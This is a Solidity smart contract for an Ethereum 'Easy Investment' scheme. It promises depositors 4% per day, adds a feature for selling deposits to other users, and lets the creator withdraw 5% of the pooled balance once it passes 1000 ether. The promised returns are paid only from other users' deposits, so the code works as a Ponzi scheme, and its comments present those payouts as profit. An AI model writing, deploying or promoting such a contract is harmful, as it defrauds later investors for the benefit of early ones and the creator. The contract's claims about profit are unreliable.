/**
 *
 * Easy Investment Contract version 2.0
 * It is a copy of original Easy Investment Contract
 * But here a unique functions is added
 * 
 * For the first time you can sell your deposit to another user!!!
 * 
 */
pragma solidity ^0.4.24;

contract EasyStockExchange {
    mapping (address => uint256) invested;
    mapping (address => uint256) atBlock;
    mapping (address => uint256) forSale;
    mapping (address => bool) isSale;
    
    address creator;
    bool paidBonus;
    uint256 success = 1000 ether;
    
    event Deals(address indexed _seller, address indexed _buyer, uint256 _amount);
    event Profit(address indexed _to, uint256 _amount);
    
    constructor () public {
        creator = msg.sender;
        paidBonus = false;
    }

    modifier onlyOnce () {
        require (msg.sender == creator,"Access denied.");
        require(paidBonus == false,"onlyOnce.");
        require(address(this).balance > success,"It is too early.");
        _;
        paidBonus = true;
    }

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.transfer(amount);
            emit Profit(sender, amount);
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
    
    
    /**
     * function add your deposit to the exchange
     * fee from a deals is 10% only if success
     * fee funds is adding to main contract balance
     */
    function startSaleDepo (uint256 _salePrice) public {
        require (invested[msg.sender] > 0,"You have not deposit for sale.");
        forSale[msg.sender] = _salePrice;
        isSale[msg.sender] = true;
    }

    /**
     * function remove your deposit from the exchange
     */    
    function stopSaleDepo () public {
        require (isSale[msg.sender] == true,"You have not deposit for sale.");
        isSale[msg.sender] = false;
    }
    
    /**
     * function buying deposit 
     */
    function buyDepo (address _depo) public payable {
        require (isSale[_depo] == true,"So sorry, but this deposit is not for sale.");
        isSale[_depo] = false; // lock reentrance

        require (forSale[_depo] == msg.value,"Summ for buying deposit is incorrect.");
        address seller = _depo;
        
        
        //keep the accrued interest of sold deposit
        uint256 amount = invested[_depo] * 4 / 100 * (block.number - atBlock[_depo]) / 5900;
        invested[_depo] += amount;


        //keep the accrued interest of buyer deposit
        if (invested[msg.sender] > 0) {
            amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;
            invested[msg.sender] += amount;
        }
        
        // change owner deposit
        invested[msg.sender] += invested[_depo];
        atBlock[msg.sender] = block.number;

        
        invested[_depo] = 0;
        atBlock[_depo] = block.number;

        
        isSale[_depo] = false;
        seller.transfer(msg.value * 9 / 10); //10% is fee for deal. This funds is stay at main contract
        emit Deals(_depo, msg.sender, msg.value);
    }
    
    function showDeposit(address _depo) public view returns(uint256) {
        return invested[_depo];
    }

    function showUnpaidDepositPercent(address _depo) public view returns(uint256) {
        return invested[_depo] * 4 / 100 * (block.number - atBlock[_depo]) / 5900;
    }
    
    function Success () public onlyOnce {
        // bonus 5% to creator for successful project
        creator.transfer(address(this).balance / 20);

    }
}